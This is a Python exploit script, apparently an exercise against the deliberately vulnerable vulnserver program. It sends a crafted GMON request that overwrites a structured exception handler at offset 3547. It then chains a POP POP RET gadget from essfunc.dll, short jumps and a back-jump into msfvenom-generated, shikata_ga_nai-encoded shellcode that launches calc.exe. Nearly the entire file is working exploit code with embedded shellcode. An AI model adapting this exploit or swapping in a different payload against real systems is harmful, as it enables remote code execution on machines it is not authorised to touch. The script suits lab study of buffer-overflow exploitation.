#!/usr/bin/env python

import socket

IP = "192.168.241.128"
PORT = 9999

# Message=    SEH record (nseh field) at 0x0101ffcc overwritten with normal pattern : 0x6f45326f (offset 3547), followed by 44 bytes of cyclic data after the handler
# msf-pattern_create -l 10000
pattern10000 = "A" * 10000

pattern128 = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae"

# max length = 118
# metasm > jmp $-1024
stage1 = "\xe9\xfb\xfb\xff\xff"
stage1 += "\x42" * (118 - len(stage1))

# max length = 1024
# msfvenom -p windows/exec CMD=calc.exe -b '\x00\x0a\0xd' -f python EXITFUNC=seh -v stage2
"""
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
Final size of python file: 1160 bytes
"""
stage2 = ""
stage2 += "\xda\xd2\xbe\x3c\x2d\xfd\x69\xd9\x74\x24\xf4\x5b"
stage2 += "\x29\xc9\xb1\x31\x31\x73\x18\x03\x73\x18\x83\xeb"
stage2 += "\xc0\xcf\x08\x95\xd0\x92\xf3\x66\x20\xf3\x7a\x83"
stage2 += "\x11\x33\x18\xc7\x01\x83\x6a\x85\xad\x68\x3e\x3e"
stage2 += "\x26\x1c\x97\x31\x8f\xab\xc1\x7c\x10\x87\x32\x1e"
stage2 += "\x92\xda\x66\xc0\xab\x14\x7b\x01\xec\x49\x76\x53"
stage2 += "\xa5\x06\x25\x44\xc2\x53\xf6\xef\x98\x72\x7e\x13"
stage2 += "\x68\x74\xaf\x82\xe3\x2f\x6f\x24\x20\x44\x26\x3e"
stage2 += "\x25\x61\xf0\xb5\x9d\x1d\x03\x1c\xec\xde\xa8\x61"
stage2 += "\xc1\x2c\xb0\xa6\xe5\xce\xc7\xde\x16\x72\xd0\x24"
stage2 += "\x65\xa8\x55\xbf\xcd\x3b\xcd\x1b\xec\xe8\x88\xe8"
stage2 += "\xe2\x45\xde\xb7\xe6\x58\x33\xcc\x12\xd0\xb2\x03"
stage2 += "\x93\xa2\x90\x87\xf8\x71\xb8\x9e\xa4\xd4\xc5\xc1"
stage2 += "\x07\x88\x63\x89\xa5\xdd\x19\xd0\xa3\x20\xaf\x6e"
stage2 += "\x81\x23\xaf\x70\xb5\x4b\x9e\xfb\x5a\x0b\x1f\x2e"
stage2 += "\x1f\xed\xee\xe3\xb5\x7a\x49\x96\xf4\xe6\x6a\x4c"
stage2 += "\x3a\x1f\xe9\x65\xc2\xe4\xf1\x0f\xc7\xa1\xb5\xfc"
stage2 += "\xb5\xba\x53\x03\x6a\xba\x71\x60\xed\x28\x19\x49"
stage2 += "\x88\xc8\xb8\x95"
stage2 += "\x42" * (1024 - len(stage2))

# 0x625010b4 : pop ebx # pop ebp # ret  |  {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v-1.0- (C:\Users\IEUser\Desktop\vulnserver-master\essfunc.dll)
"""
625010B4   5B               POP EBX
625010B5   5D               POP EBP
625010B6   C3               RETN
"""

# crash = "/.:/" + "1" * 5000
# crash = "/.:/" + pattern10000
# crash = "/.:/" + "A" * 3547 + pattern128 + "A" * (10000 - 3547 - len(pattern128))

offset_nseh = 3547
stage1_offset = offset_nseh - 118
stage2_offset = stage1_offset - 1024
# nSEH = "\x42\x42\x42\x42"
# metasm > je $-120
nSEH = "\x74\x86"
# metasm > jne $-120
nSEH += "\x75\x86"
#SEH = "\x43\x43\x43\x43"
SEH = "\xb4\x10\x50\x62" # 0x625010b4

payload = nSEH + SEH
# crash = "/.:/" + "A" * offset_nseh + payload + "C" * (10000 - offset_nseh - len(payload))
#crash = "/.:/" + "A" * stage1_offset + stage1 + payload + "C" * (10000 - offset_nseh - len(payload))
crash = "/.:/" + "A" * stage2_offset + stage2 + stage1 + payload + "C" * (10000 - offset_nseh - len(payload))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((IP, PORT))

print("connected")

payload = "GMON " + crash + "\r\n"

print("before send")
print(s.recv(10000))
s.send(payload)
print("after send")
print(s.recv(10000))

s.close()

print("connection closed")
